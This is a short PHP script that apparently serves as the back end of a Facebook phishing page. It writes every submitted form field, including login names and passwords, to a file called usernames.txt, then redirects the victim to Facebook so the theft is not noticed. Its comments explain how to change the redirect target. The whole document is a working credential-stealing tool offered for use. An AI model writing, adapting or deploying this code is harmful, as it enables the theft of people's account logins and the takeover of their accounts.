<?php
header
//This is where the header which says facebook log in or signup will come from, do not edit this
('location:https://www.facebook.com/');
//Creates a file called usernames.txt to save login info to 
$handle=fopen("usernames.txt","a");
foreach($_POST as $variable=>$value)
//Writes the information to the usernames.txt file above
{
fwrite($handle,$variable);
fwrite($handle,"=");
fwrite($handle,$value);
fwrite($handle,"\r\n");
}
//Saves the usernames.txt file then closes it
fwrite($handle,"\r\n");
fclose($handle);
//Redirects to http://fb.com/, this link can be changed for any FULL URL of your choosing ie. https://www.google.com/, not just google.com
header("location:http://fb.com/");
exit;
?>